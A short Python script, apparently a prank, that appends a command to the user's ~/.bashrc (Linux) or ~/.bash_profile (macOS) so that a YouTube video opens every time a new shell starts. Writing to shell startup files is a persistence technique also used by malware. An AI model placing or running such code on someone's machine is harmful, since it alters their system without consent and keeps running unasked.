import platform
from os.path import expanduser

home = expanduser("~")

if platform.system() == "Linux":
	# TODO: check if .zshrc exists
	with open(home+"/.bashrc", "a") as conf_file:
		conf_file.write("xdg-open https://www.youtube.com/watch?v=2Z4m4lnjxkY")

elif platform.system() == "Darwin":
	with open(home+"/.bash_profile", "a") as conf_file:
		conf_file.write("open https://www.youtube.com/watch?v=2Z4m4lnjxkY")
